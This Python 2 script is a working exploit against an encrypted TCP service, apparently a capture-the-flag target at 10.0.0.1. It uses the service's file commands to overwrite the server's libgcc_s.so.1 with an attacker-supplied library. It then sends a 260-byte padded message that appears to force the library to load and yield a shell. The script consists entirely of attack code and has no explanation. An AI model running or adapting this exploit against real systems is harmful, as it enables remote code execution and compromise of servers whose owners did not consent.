#!/usr/bin/env python
import socket
import array
import struct
import threading
import random
#https://github.com/stef/pysodium
import pysodium
import sys

def encrypt_message(nonce, public_key, secret_key, message):
	lenmessage = struct.pack("<I", len(message))+message
	encrypted = pysodium.crypto_box(lenmessage, nonce, public_key, secret_key)
	encrypted = nonce + "\x00"*16 + encrypted
	length = struct.pack("<I", len(encrypted))
	
	return length+encrypted

def decrypt_message(public_key, secret_key, message):
	decrypted = pysodium.crypto_box_open(message[40:], message[0:24], public_key, secret_key)
	return decrypted


TCP_IP = '10.0.0.1'
TCP_PORT = 20008
BUFFER_SIZE = 1024


client_pub, client_priv = pysodium.crypto_box_keypair()
nonce = pysodium.randombytes(pysodium.crypto_box_NONCEBYTES)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
server_pub = s.recv(BUFFER_SIZE)

s.send(str(client_pub))

message = "o0777lib/i386-linux-gnu/libgcc_s.so.1"
s.send(encrypt_message(nonce, server_pub, client_priv, message))
size = s.recv(4)
size = struct.unpack("<I", size)[0]
data = s.recv(size)
try:
	decryptedmessage = decrypt_message(server_pub, client_priv, data)
	print "%s" % decryptedmessage[4:]
except:
	print data
	sys.exit(-1)

fd = int(decryptedmessage[10:13])
sofd = open("libgcc_s.so.1", "r")
so = sofd.read()
sofd.close()

message = "w"+str(fd)+",0"+so
s.send(encrypt_message(nonce, server_pub, client_priv, message))
size = s.recv(4)
size = struct.unpack("<I", size)[0]
data = s.recv(size)
try:
	print "%s" % decrypt_message(server_pub, client_priv, data)[4:]
except:
	print data
	sys.exit(-1)

message = "c"+str(fd)
s.send(encrypt_message(nonce, server_pub, client_priv, message))
size = s.recv(4)
size = struct.unpack("<I", size)[0]
data = s.recv(size)
try:
	print "%s" % decrypt_message(server_pub, client_priv, data)[4:]
except:
	print data
	sys.exit(-1)

message = "m0777sh"+"B"*260
s.send(encrypt_message(nonce, server_pub, client_priv, message))
size = s.recv(4)
size = struct.unpack("<I", size)[0]
data = s.recv(size)
try:
	print "%s" % decrypt_message(server_pub, client_priv, data)
except:
	print data

data = s.recv(BUFFER_SIZE)
print data
data = s.recv(BUFFER_SIZE)
print data


s.close()
